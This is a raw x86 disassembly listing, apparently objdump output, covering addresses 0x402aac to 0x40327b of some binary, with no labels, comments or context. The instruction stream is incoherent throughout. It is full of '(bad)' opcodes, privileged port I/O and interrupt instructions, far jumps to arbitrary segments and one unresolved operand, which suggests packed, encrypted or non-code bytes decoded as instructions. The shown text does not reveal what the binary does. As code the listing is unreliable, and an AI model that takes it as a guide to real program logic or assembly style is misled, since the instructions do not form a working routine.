  402aac:	xor    dh,BYTE PTR [ecx-0x75ddf999]
  402ab2:	and    BYTE PTR [edx+0xc],0xca
  402ab6:	aad    0x4a
  402ab8:	fsubr  QWORD PTR [esi+0x67]
  402abb:	cld    
  402abc:	out    dx,eax
  402abd:	jmp    0x521e:0xfae8f25b
  402ac4:	imul   edx,DWORD PTR [eax],0x171a749
  402aca:	mov    esp,0x2855eca8
  402acf:	stos   BYTE PTR es:[edi],al
  402ad0:	xor    esi,edx
  402ad2:	fld    st(2)
  402ad4:	pop    eax
  402ad5:	repnz xchg ebx,eax
  402ad7:	jae    0x402a9d
  402ad9:	and    esi,DWORD PTR [eax-0x2c59534e]
  402adf:	xchg   DWORD PTR [edi],esi
  402ae1:	push   ss
  402ae2:	mov    ds:0x754249f4,al
  402ae7:	lahf   
  402ae8:	push   ss
  402ae9:	push   cs
  402aea:	retf   
  402aeb:	add    eax,0x76368a
  402af0:	mov    ecx,0x7c5290b5
  402af5:	int    0xb
  402af7:	add    DWORD PTR [esi],ecx
  402af9:	push   0xffffffb5
  402afb:	jae    0x402b71
  402afd:	cmp    al,0x3
  402aff:	push   ss
  402b00:	dec    esi
  402b01:	mov    bh,0x6d
  402b03:	mov    ch,0x39
  402b05:	mov    dl,0x3e
  402b07:	cwde   
  402b08:	lods   eax,DWORD PTR ds:[esi]
  402b09:	aad    0x1e
  402b0b:	(bad)  
  402b0c:	sar    DWORD PTR [edi],cl
  402b0e:	(bad)  
  402b0f:	push   ds
  402b10:	inc    eax
  402b11:	leave  
  402b12:	jmp    0x703a:0x125d396a
  402b19:	lods   al,BYTE PTR ds:[esi]
  402b1a:	sub    DWORD PTR [edx-0x4a],ebx
  402b1d:	setno  BYTE PTR [esi+ebx*1+0x20]
  402b22:	adc    dl,BYTE PTR [edi-0x1d44b3f3]
  402b28:	and    edx,DWORD PTR [eax+0x14d4b55c]
  402b2e:	inc    ecx
  402b2f:	scas   eax,DWORD PTR es:[edi]
  402b30:	adc    DWORD PTR [ebp-0x6],0x717a455e
  402b37:	ret    
  402b38:	sub    eax,0x9cc27052
  402b3d:	(bad)  
  402b3e:	push   eax
  402b3f:	cmp    al,0x31
  402b41:	ror    dl,0x19
  402b44:	cmp    eax,0x35ea7972
  402b49:	sub    eax,0xf7e4ed11
  402b4e:	add    dl,ch
  402b50:	rol    DWORD PTR [ebp+0x2f],0xe0
  402b54:	data16 xor ch,BYTE PTR [ebx+0xa94008]
  402b5b:	jg     0x402afc
  402b5d:	loop   0x402aed
  402b5f:	mov    ds:0x7a0820e4,eax
  402b64:	sub    DWORD PTR [ebx-0x55eda53d],esi
  402b6a:	adc    al,0xc6
  402b6c:	fild   QWORD PTR [esi-0x1f]
  402b6f:	mov    esi,0xf0bcab3f
  402b74:	or     al,0xe5
  402b76:	pop    edx
  402b77:	repz daa 
  402b79:	nop
  402b7a:	(bad)  
  402b7b:	nop
  402b7c:	repnz mov ecx,es
  402b7f:	mov    edi,0x31434fa9
  402b84:	in     eax,dx
  402b85:	sub    edx,DWORD PTR [edi+0x66]
  402b88:	or     al,0xfe
  402b8a:	jb     0x402b4c
  402b8c:	call   0xacbbd59e
  402b91:	sbb    eax,DWORD PTR [eax-0x5e]
  402b94:	cdq    
  402b95:	and    ah,ah
  402b97:	dec    ebx
  402b98:	fs mov ecx,cs
  402b9b:	mov    DWORD PTR [eax+0xc5888ab],eax
  402ba1:	inc    esp
  402ba2:	(bad)  
  402ba3:	xchg   ecx,eax
  402ba4:	(bad)  
  402ba5:	out    0x8a,al
  402ba7:	cmp    DWORD PTR [edi],edx
  402ba9:	mov    WORD PTR [esi+edi*1+0x38b8b93b],cs
  402bb0:	sbb    BYTE PTR [eax-0x5f],0xd8
  402bb4:	pop    ss
  402bb5:	add    BYTE PTR [bx+di+0x5d],bh
  402bb9:	pop    edx
  402bba:	scas   al,BYTE PTR es:[edi]
  402bbb:	adc    bh,BYTE PTR [edx+esi*2+0x71]
  402bbf:	sbb    al,0x36
  402bc1:	xlat   BYTE PTR ds:[ebx]
  402bc2:	push   eax
  402bc3:	add    eax,0x3e5d96bf
  402bc8:	sub    cl,BYTE PTR [esi]
  402bca:	push   ecx
  402bcb:	and    eax,0x310a6d53
  402bd0:	pop    es
  402bd1:	mov    DWORD PTR [ecx-0x235315b5],ebx
  402bd7:	pop    eax
  402bd8:	mov    dl,0xf6
  402bda:	push   edx
  402bdb:	mov    eax,0x6c5a9b33
  402be0:	aam    0xbc
  402be2:	push   ebx
  402be3:	in     eax,0xfa
  402be5:	mov    eax,0x2e1bb2ed
  402bea:	adc    ah,ah
  402bec:	arpl   WORD PTR [esi-0x46881b0f],di
  402bf2:	ret    0xdba9
  402bf5:	sbb    eax,0xecfbbed6
  402bfa:	or     cl,bl
  402bfc:	mov    cs,WORD PTR ds:0xea14fc81
  402c02:	test   BYTE PTR [esi-0x4c],dh
  402c05:	call   0xad4e7223
  402c0a:	xor    al,0xcd
  402c0c:	out    dx,al
  402c0d:	mov    al,ds:0x6b6c8973
  402c12:	xor    esi,DWORD PTR [esi]
  402c14:	fidivr DWORD PTR [eax]
  402c16:	xor    ebx,DWORD PTR [ebp-0x2b]
  402c19:	mov    dh,0x80
  402c1b:	les    eax,FWORD PTR [eax+0x50]
  402c1e:	(bad)  
  402c1f:	push   ebp
  402c20:	cs in  eax,0x87
  402c23:	mov    dh,0x7b
  402c25:	add    ebx,0x5d
  402c28:	jb     0x402c8a
  402c2a:	stos   BYTE PTR es:[edi],al
  402c2b:	adc    DWORD PTR [ebx+eiz*8+0x12],ecx
  402c2f:	xchg   ebx,eax
  402c30:	aad    0x15
  402c32:	or     BYTE PTR [edi],bl
  402c34:	push   0xffffff91
  402c36:	mov    ds:0xf54133f3,al
  402c3b:	pop    es
  402c3c:	xlat   BYTE PTR ds:[ebx]
  402c3d:	xchg   ebx,eax
  402c3e:	cld    
  402c3f:	ins    DWORD PTR es:[edi],dx
  402c40:	jae    0x402c2c
  402c42:	jmp    0x7f1a1ccd
  402c47:	mov    ds:0xf1f32f87,eax
  402c4c:	aas    
  402c4d:	lock jno 0x402c45
  402c50:	arpl   WORD PTR [ebx],cx
  402c52:	pop    esp
  402c53:	mov    al,ds:0xe02b06bc
  402c58:	dec    eax
  402c59:	jne    0x402c22
  402c5b:	shr    DWORD PTR ds:0x6593,0x41
  402c61:	mov    al,0x6d
  402c63:	push   ebp
  402c64:	dec    ebp
  402c65:	test   bl,bl
  402c67:	test   esp,0xc7deb570
  402c6d:	mov    ds:0x2bd7c842,al
  402c72:	mov    ecx,0xa4482dff
  402c77:	sub    ebx,DWORD PTR [esi]
  402c79:	popa   
  402c7a:	mov    ah,0xae
  402c7c:	sbb    DWORD PTR gs:[eax+0x63795a04],ebx
  402c83:	xor    BYTE PTR [eax-0x1e5cb1b2],ah
  402c89:	inc    ecx
  402c8a:	call   0x9e3689c3
  402c8f:	add    ch,bl
  402c91:	mov    ds:0x63e2587,eax
  402c96:	jmp    0x7cf3:0xdf17d433
  402c9d:	popa   
  402c9e:	or     DWORD PTR [ecx],ecx
  402ca0:	push   ebp
  402ca1:	or     eax,DWORD PTR [edi-0x2b50da0b]
  402ca7:	jnp    0x402d13
  402ca9:	lea    esi,[edx+0x72]
  402cac:	pop    esi
  402cad:	mov    al,0x56
  402caf:	fisub  DWORD PTR [edx+0xf58faed]
  402cb5:	pop    edx
  402cb6:	or     al,BYTE PTR [eax]
  402cb8:	or     ebp,DWORD PTR [esi]
  402cba:	out    dx,eax
  402cbb:	dec    ebx
  402cbc:	ror    BYTE PTR [ebx+0xb638a56],0x25
  402cc3:	mov    ebp,0xf1639325
  402cc8:	leave  
  402cc9:	loopne 0x402c4d
  402ccb:	mov    ds:0xbbfa2dfd,eax
  402cd0:	push   esp
  402cd1:	fst    DWORD PTR [edi+eiz*2-0xb4a581]
  402cd8:	leave  
  402cd9:	das    
  402cda:	push   0xb88a9826
  402cdf:	in     al,0xcd
  402ce1:	or     DWORD PTR [ebx+0x54],ecx
  402ce4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402ce5:	cmp    al,0xf8
  402ce7:	inc    edi
  402ce8:	xor    eax,0x6ee85505
  402ced:	xchg   DWORD PTR [eax-0x33b4ca36],ebp
  402cf3:	sahf   
  402cf4:	mov    ax,ds:0x57955d0b
  402cfa:	pop    esi
  402cfb:	and    eax,0xb51c46c7
  402d00:	dec    edi
  402d01:	pop    eax
  402d02:	xchg   ecx,eax
  402d03:	test   al,0x5c
  402d05:	cs inc esi
  402d07:	push   0xe
  402d09:	jbe    0x402d7c
  402d0b:	leave  
  402d0c:	or     edi,DWORD PTR [ebx+0x22]
  402d0f:	xchg   DWORD PTR [esi+0x43],esp
  402d12:	in     eax,0xf3
  402d14:	sub    al,0x7e
  402d16:	jnp    0x402cc5
  402d18:	retf   
  402d19:	lahf   
  402d1a:	jnp    0x402d1e
  402d1c:	cmp    al,0x58
  402d1e:	dec    esi
  402d1f:	arpl   WORD PTR [eax+0x20],di
  402d22:	add    al,0x98
  402d24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402d25:	ror    edi,cl
  402d27:	rcr    ch,cl
  402d29:	mov    ebp,0x2a8e99e9
  402d2e:	push   ebx
  402d2f:	jp     0x402cd7
  402d31:	push   edx
  402d32:	cmp    BYTE PTR [esi],ah
  402d34:	inc    edx
  402d35:	fdiv   st,st(1)
  402d37:	fldenv [eax+0x50]
  402d3a:	or     eax,0x24c978a9
  402d3f:	pop    ebx
  402d40:	stos   BYTE PTR es:[edi],al
  402d41:	out    0x92,eax
  402d43:	add    ah,bh
  402d45:	xor    DWORD PTR [eax+0xd],0xffffff9b
  402d49:	sub    al,0x86
  402d4b:	adc    bl,bh
  402d4d:	imul   ebx,ecx,0xdf43515b
  402d53:	push   cs
  402d54:	mov    ds:0xaa6c0bde,al
  402d59:	mov    ds:0xa66aab53,eax
  402d5e:	fisttp QWORD PTR [ebx+0x79a99130]
  402d64:	push   cs
  402d65:	inc    edx
  402d66:	xor    BYTE PTR [esi+0x12fbe2e2],bh
  402d6c:	scas   eax,DWORD PTR es:[edi]
  402d6d:	mov    esp,0xe470f69e
  402d72:	(bad)  
  402d73:	xchg   esp,eax
  402d74:	and    al,0x6f
  402d76:	mov    edx,0xc3681b90
  402d7b:	mov    ds:0xe3a06659,al
  402d80:	xchg   esi,eax
  402d81:	out    dx,al
  402d82:	neg    BYTE PTR [ebp-0x167781c4]
  402d88:	mov    al,ds:0x9f639798
  402d8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402d8e:	ins    BYTE PTR es:[edi],dx
  402d8f:	sub    DWORD PTR [esi+0x44],edx
  402d92:	and    bh,BYTE PTR [edi-0x3e94d43e]
  402d98:	pop    edx
  402d99:	popw   ss
  402d9b:	out    0x8e,eax
  402d9d:	pop    edi
  402d9e:	dec    edi
  402d9f:	pop    ss
  402da0:	int    0xbe
  402da2:	or     eax,0xe270aa5e
  402da7:	mov    BYTE PTR [ebp+0x2c],bh
  402daa:	jmp    0xc2451838
  402daf:	jne    0x402d3a
  402db1:	xchg   ebp,eax
  402db2:	dec    esp
  402db3:	test   bh,cl
  402db5:	mov    DWORD PTR [edx+0xe],esi
  402db8:	aas    
  402db9:	(bad)  
  402dba:	cmp    ch,BYTE PTR [ecx+0xabf1bc5]
  402dc0:	mov    edx,0x8898bb23
  402dc5:	sbb    eax,0x14b034c8
  402dca:	dec    ebx
  402dcb:	idiv   al
  402dcd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402dcf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402dd0:	call   FWORD PTR [esi+0x6b]
  402dd3:	or     eax,0x386ab9b
  402dd8:	out    0x46,al
  402dda:	outs   dx,BYTE PTR ds:[esi]
  402ddb:	dec    esp
  402ddc:	push   ebx
  402ddd:	mov    bh,0x5d
  402ddf:	pop    edx
  402de0:	pop    edx
  402de1:	je     0x402da8
  402de3:	inc    ebx
  402de4:	inc    esp
  402de5:	pop    es
  402de6:	adc    DWORD PTR [edx+0x32],0xf4b244a3
  402ded:	cld    
  402dee:	clc    
  402def:	push   ebx
  402df0:	data16 jle 0x402e57
  402df3:	jne    0x402e5a
  402df5:	test   DWORD PTR [esi+0x4d],esp
  402df8:	jo     0x402dac
  402dfa:	cmp    ebx,ebp
  402dfc:	test   bl,dl
  402dfe:	dec    eax
  402dff:	jo     0x402e5b
  402e01:	pop    cx
  402e03:	(bad)  
  402e04:	mov    bl,0x8b
  402e06:	out    dx,eax
  402e07:	mov    edi,0x64fc9e48
  402e0c:	xor    eax,0xe5aade3e
  402e11:	out    dx,al
  402e12:	scas   eax,DWORD PTR es:[edi]
  402e13:	pushf  
  402e14:	dec    ecx
  402e15:	xor    eax,0xe661f10
  402e1a:	loope  0x402e83
  402e1c:	stos   BYTE PTR es:[edi],al
  402e1d:	cmp    eax,DWORD PTR [ecx-0x5c]
  402e20:	sbb    BYTE PTR [ebx],al
  402e22:	lea    edx,[edx+0x17]
  402e25:	ins    BYTE PTR es:[edi],dx
  402e26:	addr16 mov esi,0x52e83e1c
  402e2c:	and    DWORD PTR [eax],esp
  402e2e:	enter  0xdd30,0x7d
  402e32:	fstp   TBYTE PTR [edx]
  402e34:	jmp    0x21e2:0x6fa7201f
  402e3b:	dec    edi
  402e3c:	xor    eax,0xc02986a8
  402e41:	xor    edx,esi
  402e43:	rcr    BYTE PTR [edx-0x63],1
  402e46:	jp     0x402de7
  402e48:	repz aas 
  402e4a:	push   esp
  402e4b:	lock retf 
  402e4d:	xchg   edi,eax
  402e4e:	add    bl,dl
  402e50:	pop    ecx
  402e51:	pop    edi
  402e52:	cmp    al,0xcf
  402e54:	cmp    cl,cl
  402e56:	xor    eax,0xaf1d8cf7
  402e5b:	mov    ah,0xdf
  402e5d:	imul   esi,DWORD PTR [esi+0xd],0xacbc14c5
  402e64:	mov    eax,0x95d553f3
  402e69:	call   0x30ca0e62
  402e6e:	mov    ah,0x20
  402e70:	les    edi,FWORD PTR [edx]
  402e72:	pop    esp
  402e73:	push   0xdcef2c18
  402e78:	or     ebp,DWORD PTR [esi]
  402e7a:	dec    ebx
  402e7b:	imul   ebx,DWORD PTR [esp+ebx*4+0x5240cbed],0xc26861b3
  402e86:	or     BYTE PTR [eax],0xc3
  402e89:	(bad)  
  402e8a:	cwde   
  402e8b:	popf   
  402e8c:	cmp    cl,BYTE PTR [edi]
  402e8e:	and    al,0x6e
  402e90:	adc    eax,0xa9a75b62
  402e95:	fstp   DWORD PTR [esi+ecx*2+0x9]
  402e99:	pop    ebp
  402e9a:	sbb    edx,edi
  402e9c:	xchg   ecx,eax
  402e9d:	xor    eax,DWORD PTR [ebx]
  402e9f:	outs   dx,DWORD PTR ds:[esi]
  402ea0:	mov    ebp,0x1dd3fee2
  402ea5:	sar    ah,cl
  402ea7:	stos   DWORD PTR es:[edi],eax
  402ea8:	dec    ebp
  402ea9:	nop
  402eaa:	(bad)  
  402eab:	pop    eax
  402eac:	outs   dx,DWORD PTR ds:[esi]
  402ead:	rcr    DWORD PTR [edi],cl
  402eaf:	outs   dx,DWORD PTR ds:[esi]
  402eb0:	repz push ss
  402eb2:	sti    
  402eb3:	out    0x44,al
  402eb5:	pop    es
  402eb6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402eb7:	pop    esi
  402eb8:	mov    dh,0x86
  402eba:	pop    edi
  402ebb:	adc    al,0xb7
  402ebd:	rcl    DWORD PTR [edx],0xa9
  402ec0:	std    
  402ec1:	fsubr  DWORD PTR [ebx-0x3628a3c3]
  402ec7:	out    dx,eax
  402ec8:	pushf  
  402ec9:	and    eax,DWORD PTR [eax+0x19]
  402ecc:	xchg   ebx,eax
  402ecd:	lds    edi,FWORD PTR [edx]
  402ecf:	out    0xd1,al
  402ed1:	push   ss
  402ed2:	push   esi
  402ed3:	(bad)  
  402ed4:	and    al,0x24
  402ed6:	dec    esp
  402ed7:	dec    esp
  402ed8:	inc    esi
  402ed9:	pop    es
  402eda:	and    eax,DWORD PTR [edx]
  402edc:	pushf  
  402edd:	mov    ebp,0x772910d9
  402ee2:	loope  0x402f45
  402ee4:	pop    edx
  402ee5:	retf   0x8565
  402ee8:	add    dh,BYTE PTR [ebx+0x6672c153]
  402eee:	test   BYTE PTR [edi+0x3c],dl
  402ef1:	sar    eax,0xa4
  402ef4:	iret   
  402ef5:	and    DWORD PTR [ebp-0x5a],esi
  402ef8:	rol    esp,1
  402efa:	sub    al,0x9c
  402efc:	push   esi
  402efd:	(bad)  
  402efe:	fadd   st(4),st
  402f00:	xor    BYTE PTR es:[edx-0x6a],al
  402f04:	int    0x76
  402f06:	test   DWORD PTR [ebx],edi
  402f08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402f09:	dec    ebx
  402f0a:	mov    ecx,0x42d08533
  402f0f:	out    0x14,eax
  402f11:	ret    
  402f12:	gs icebp 
  402f14:	sahf   
  402f15:	cmp    eax,0xc9617de3
  402f1a:	xchg   BYTE PTR [ebx+0x9],cl
  402f1d:	fstp   TBYTE PTR [ecx+0x1f]
  402f20:	mov    al,ds:0xa4723e92
  402f25:	ret    
  402f26:	mov    ecx,0x422ac498
  402f2b:	out    0x26,al
  402f2d:	inc    edi
  402f2e:	xor    BYTE PTR [ecx],bh
  402f30:	adc    BYTE PTR [edx],0x91
  402f33:	sbb    al,0x34
  402f35:	inc    edi
  402f36:	lahf   
  402f37:	mov    edi,0xa2cda47e
  402f3c:	mov    eax,0xef8f70d7
  402f41:	int3   
  402f42:	inc    edi
  402f43:	inc    ecx
  402f44:	xchg   ebx,eax
  402f45:	jns    0x402f1a
  402f47:	pusha  
  402f48:	iret   
  402f49:	rcl    DWORD PTR [ebp-0x79cf612e],0x9
  402f50:	mov    ecx,0x1c9fc791
  402f55:	imul   ebp,DWORD PTR [eax],0x220f7cfe
  402f5b:	push   0x6a
  402f5d:	pop    ds
  402f5e:	inc    eax
  402f5f:	fcmovnbe st,st(2)
  402f61:	gs scas eax,DWORD PTR es:[edi]
  402f63:	js     0x402fd8
  402f65:	ret    
  402f66:	daa    
  402f67:	test   al,0x2f
  402f69:	repz test eax,0xe6830cbd
  402f6f:	mov    DWORD PTR [ebp-0x34],edi
  402f72:	adc    BYTE PTR [eax],dl
  402f74:	pop    ss
  402f75:	arpl   WORD PTR [esi-0x3be8554f],dx
  402f7b:	xlat   BYTE PTR ds:[ebx]
  402f7c:	xor    BYTE PTR [ecx-0x783b2c69],al
  402f82:	push   edi
  402f83:	mov    dh,0x4
  402f85:	call   0xd78f:0x360f7449
  402f8c:	dec    esp
  402f8d:	ds dec edx
  402f8f:	sub    DWORD PTR [eax],ecx
  402f91:	bound  edx,QWORD PTR [ecx-0x10]
  402f94:	or     ah,BYTE PTR [edi-0x56]
  402f97:	pushf  
  402f98:	jbe    0x402f75
  402f9a:	dec    edi
  402f9b:	stos   BYTE PTR es:[edi],al
  402f9c:	jp     0x402f6b
  402f9e:	sub    al,0x34
  402fa0:	mov    al,BYTE PTR [edx+eax*8-0x4dc5aa9c]
  402fa7:	retf   0x5dc7
  402faa:	xor    esp,DWORD PTR [edi+eiz*4-0xd53e61]
  402fb1:	fbld   TBYTE PTR [eax+0x17842c0e]
  402fb7:	push   eax
  402fb8:	in     al,0x9d
  402fba:	pop    ecx
  402fbb:	loope  0x40302e
  402fbd:	xor    BYTE PTR [esi-0x1774763d],0xc7
  402fc4:	sbb    ah,BYTE PTR [ebx+ebx*1-0x642bbf2d]
  402fcb:	daa    
  402fcc:	pop    edx
  402fcd:	jp     0x402fa1
  402fcf:	mov    ah,0xcb
  402fd1:	out    0xb2,eax
  402fd3:	cmp    al,0xf7
  402fd5:	(bad)  
  402fd6:	or     BYTE PTR [ecx+0x3b7883c8],cl
  402fdc:	mov    ebx,0x1496cb11
  402fe1:	mov    ds:0x8969cf27,eax
  402fe6:	xor    edx,esi
  402fe8:	jle    0x402fc0
  402fea:	inc    ebx
  402feb:	fisttp QWORD PTR [esi+ecx*4]
  402fee:	cli    
  402fef:	bound  edx,QWORD PTR [ecx-0x26bc567a]
  402ff5:	sbb    edx,DWORD PTR [eax+ecx*4]
  402ff8:	or     eax,0x4a785432
  402ffd:	and    eax,0x620d14ec
  403002:	rcr    esi,1
  403004:	jbe    0x403003
  403006:	test   edi,ebx
  403008:	jge    0x403007
  40300a:	in     eax,0xe8
  40300c:	mov    BYTE PTR [edi-0x18],ch
  40300f:	stos   BYTE PTR es:[edi],al
  403010:	push   esp
  403011:	push   es
  403012:	fucomi st,st(7)
  403014:	sub    DWORD PTR [ebp+0x1a],eax
  403017:	mov    bh,0xee
  403019:	fldcw  WORD PTR [eax+0x30179f0]
  40301f:	or     eax,DWORD PTR [ecx-0x25f1bce8]
  403025:	test   DWORD PTR ds:0x5aa51b55,eax
  40302b:	pushf  
  40302c:	rol    DWORD PTR [ebx-0x75],cl
  40302f:	(bad)  
  403030:	js     0x403058
  403032:	pusha  
  403033:	sar    esp,cl
  403035:	jg     0x40302b
  403037:	retf   
  403038:	cmp    DWORD PTR [eax+0x5b31b607],0xee4a7808
  403042:	dec    esp
  403043:	mov    DWORD PTR [esi+0x2c094d5e],ebx
  403049:	push   edi
  40304a:	inc    ebp
  40304b:	imul   edx,DWORD PTR [ebp+0x7d],0x4b
  40304f:	cmp    DWORD PTR [edi],ecx
  403051:	hlt    
  403052:	jecxz  0x403008
  403054:	or     DWORD PTR [ebx+0x5e],ecx
  403057:	push   0xffffff81
  403059:	xchg   edx,eax
  40305a:	push   edx
  40305b:	arpl   WORD PTR [edx-0x7ab7dd4e],ax
  403061:	stc    
  403062:	in     eax,dx
  403063:	or     al,0x71
  403065:	out    0x91,al
  403067:	jns    0x403017
  403069:	and    BYTE PTR [esi+0x48],0x42
  40306d:	imul   esp,DWORD PTR [ecx],0xd2a097fa
  403073:	jns    0x40300d
  403075:	shl    eax,cl
  403077:	push   ecx
  403078:	lods   eax,DWORD PTR ds:[esi]
  403079:	lahf   
  40307a:	mov    al,ds:0xd38fbe33
  40307f:	hlt    
  403080:	test   BYTE PTR [edi+ebx*4],dl
  403083:	sbb    eax,0x3053bef6
  403088:	pop    ds
  403089:	and    BYTE PTR [edi-0x1a16fd40],dl
  40308f:	lahf   
  403090:	push   eax
  403091:	xor    edi,DWORD PTR [eax]
  403093:	scas   al,BYTE PTR es:[edi]
  403094:	jle    0x40303f
  403096:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403097:	mov    bl,0x6d
  403099:	or     eax,0x80a92d8a
  40309e:	aaa    
  40309f:	dec    edx
  4030a0:	and    al,0xd3
  4030a2:	cdq    
  4030a3:	or     DWORD PTR [ebp+ecx*8+0x21],edi
  4030a7:	es jo  0x4030cb
  4030aa:	pusha  
  4030ab:	cmp    DWORD PTR [edi+0x44],eax
  4030ae:	mov    WORD PTR [esi+0x79],es
  4030b1:	and    DWORD PTR [esp+edx*4+0x8],ecx
  4030b5:	jl     0x40306f
  4030b7:	jae    0x4030aa
  4030b9:	mov    edx,0xdce6e937
  4030be:	pop    ebx
  4030bf:	adc    DWORD PTR [ebx-0x7bb984d4],esi
  4030c5:	nop
  4030c6:	push   edx
  4030c7:	jge    0x40308a
  4030c9:	call   0xaa5f:0xe70f4f7b
  4030d0:	xlat   BYTE PTR ds:[ebx]
  4030d1:	arpl   WORD PTR [ebx],di
  4030d3:	outs   dx,BYTE PTR ds:[esi]
  4030d4:	daa    
  4030d5:	lods   eax,DWORD PTR ds:[esi]
  4030d6:	adc    BYTE PTR [ebp+0x2373cbc],0x66
  4030dd:	aaa    
  4030de:	mov    esi,0x180223f2
  4030e3:	adc    BYTE PTR [ecx+0xd],0xa7
  4030e7:	push   cs
  4030e8:	pop    eax
  4030e9:	dec    edi
  4030ea:	rol    DWORD PTR [eax-0x11c0eba6],1
  4030f0:	ss (bad) 
  4030f2:	out    dx,al
  4030f3:	aam    0xe
  4030f5:	icebp  
  4030f6:	ins    BYTE PTR es:[edi],dx
  4030f7:	push   0x2e
  4030f9:	ret    0xa0ff
  4030fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4030fd:	jbe    0x40313b
  4030ff:	dec    ecx
  403100:	cpuid  
  403102:	xchg   ebp,eax
  403103:	shr    BYTE PTR ds:0x1fe2c6a5,0xc0
  40310a:	aad    0xd7
  40310c:	repnz stos DWORD PTR es:[edi],eax
  40310e:	sbb    edx,ebx
  403110:	cmp    bl,BYTE PTR [eax]
  403112:	fwait
  403113:	cld    
  403114:	aaa    
  403115:	xchg   edx,eax
  403116:	in     eax,dx
  403117:	shr    WORD PTR [eax-0x277fdf37],cl
  40311e:	pop    ebp
  40311f:	or     dl,BYTE PTR [esi+0x1c67aa27]
  403125:	mov    esi,0x331c7f12
  40312a:	mov    ecx,0xf3becd2f
  40312f:	dec    esp
  403130:	add    eax,DWORD PTR [ebp-0x9]
  403133:	mov    al,ds:0x7fbf4d42
  403138:	int3   
  403139:	test   DWORD PTR [edi],0x8396c133
  40313f:	jb     0x4030ce
  403141:	stos   BYTE PTR es:[edi],al
  403142:	pop    edx
  403143:	rcl    ch,cl
  403145:	mov    BYTE PTR [edx+0x1f],0x33
  403149:	clts   
  40314b:	lods   al,BYTE PTR ds:[esi]
  40314c:	pop    ebp
  40314d:	loope  0x4030da
  40314f:	or     BYTE PTR [ecx],bl
  403151:	inc    ecx
  403152:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403153:	jo     0x4030e0
  403155:	jne    0x4030fc
  403157:	pop    ecx
  403158:	inc    edx
  403159:	mov    ch,0x41
  40315b:	imul   edx,DWORD PTR [edx+ebp*2+0x71a2053c],0x68adf2c9
  403166:	pop    ebp
  403167:	daa    
  403168:	cmc    
  403169:	jnp    0x4031a8
  40316b:	nop
  40316c:	test   BYTE PTR [eax+0x3d],0xc3
  403170:	jp     0x403123
  403172:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403173:	cmp    edi,edi
  403175:	inc    ecx
  403176:	fisttp DWORD PTR [edi+0x3b]
  403179:	sbb    BYTE PTR [eax+0x6f9382a5],dl
  40317f:	sub    cl,dl
  403181:	cmp    BYTE PTR [edx],0xd0
  403184:	(bad)  
  403185:	pop    edx
  403186:	adc    dh,dl
  403188:	mov    DWORD PTR [esi-0x188ee6e4],ebx
  40318e:	aaa    
  40318f:	mov    WORD PTR [ebx+0x7b],fs
  403192:	imul   esp,edx,0x26
  403195:	loopne 0x403168
  403197:	sbb    cl,bh
  403199:	rcl    BYTE PTR [esi+edx*4],0x6c
  40319d:	in     eax,dx
  40319e:	fild   DWORD PTR [esi-0x8]
  4031a1:	sub    dh,cl
  4031a3:	icebp  
  4031a4:	xor    edi,ebp
  4031a6:	ffree  st(7)
  4031a8:	into   
  4031a9:	in     al,0x9d
  4031ab:	mov    al,ds:0xccfe3120
  4031b0:	cmp    DWORD PTR [esi+0x55],0xffffffe6
  4031b4:	icebp  
  4031b5:	mov    WORD PTR [ebp+edi*4+0x2ea1f815],ds
  4031bc:	sbb    al,0xf1
  4031be:	inc    edi
  4031bf:	cmp    eax,0x78427e7c
  4031c4:	lahf   
  4031c5:	mov    dh,0x7a
  4031c7:	inc    eax
  4031c8:	jmp    0x403181
  4031ca:	sub    bh,al
  4031cc:	cmp    BYTE PTR [edi+0x7b],0x4
  4031d0:	sar    DWORD PTR [esi+eiz*1+0x79a65675],0x4c
  4031d8:	js     0x4031f5
  4031da:	push   eax
  4031db:	aam    0xca
  4031dd:	cwde   
  4031de:	cld    
  4031df:	das    
  4031e0:	push   DWORD PTR [edx-0x17f7b425]
  4031e6:	pop    esi
  4031e7:	xor    BYTE PTR [edx+0x7fdea17a],ch
  4031ed:	pop    ecx
  4031ee:	les    ecx,FWORD PTR gs:[eax+0x61]
  4031f2:	sbb    BYTE PTR [edi],dh
  4031f4:	mov    ecx,0x189c9ea0
  4031f9:	in     eax,0x7a
  4031fb:	pushf  
  4031fc:	xchg   BYTE PTR [ecx-0x35],bh
  4031ff:	mov    esp,0x588ad040
  403204:	jns    0x40327f
  403206:	sbb    al,0x4c
  403208:	into   
  403209:	scas   al,BYTE PTR es:[edi]
  40320a:	(bad)  
  40320b:	sub    eax,0xc5302217
  403210:	pop    edi
  403211:	in     eax,0xdb
  403213:	cmp    esi,DWORD PTR [edx+0x38]
  403216:	mov    cl,BYTE PTR [edi]
  403218:	ss jg  0x403253
  40321b:	mov    bh,0x31
  40321d:	aam    0x5f
  40321f:	jecxz  0x403201
  403221:	pop    ds
  403222:	mov    ds:0x76acfc51,eax
  403227:	ins    BYTE PTR es:[edi],dx
  403228:	rcl    BYTE PTR [ebp-0x6],cl
  40322b:	mov    esi,0x6ef46850
  403230:	pop    ebx
  403231:	aad    0x18
  403233:	mov    WORD PTR [esi],?
  403235:	inc    esi
  403236:	jns    0x403255
  403238:	(bad)  
  403239:	mov    ebx,0x580f5696
  40323e:	fistp  DWORD PTR [ecx-0x8]
  403241:	mov    bl,0x8
  403243:	jmp    0xc03eb0f5
  403248:	shr    BYTE PTR ds:0x64337a8,cl
  40324e:	(bad)  
  40324f:	stos   DWORD PTR es:[edi],eax
  403250:	inc    ebx
  403251:	push   ebp
  403252:	jnp    0x4031d5
  403254:	popf   
  403255:	in     al,0x3c
  403257:	int    0xe8
  403259:	das    
  40325a:	mov    esp,0x92078654
  40325f:	adc    BYTE PTR [ebx+0x4429de1f],ch
  403265:	mov    WORD PTR [ebx-0x215896c1],cs
  40326b:	mov    edx,0xb3295d6
  403270:	pop    edx
  403271:	jns    0x403208
  403273:	jnp    0x403211
  403275:	inc    esp
  403276:	test   eax,0x6bf9b6b0
  40327b:	adc    DWORD PTR [edx+0x75],esi
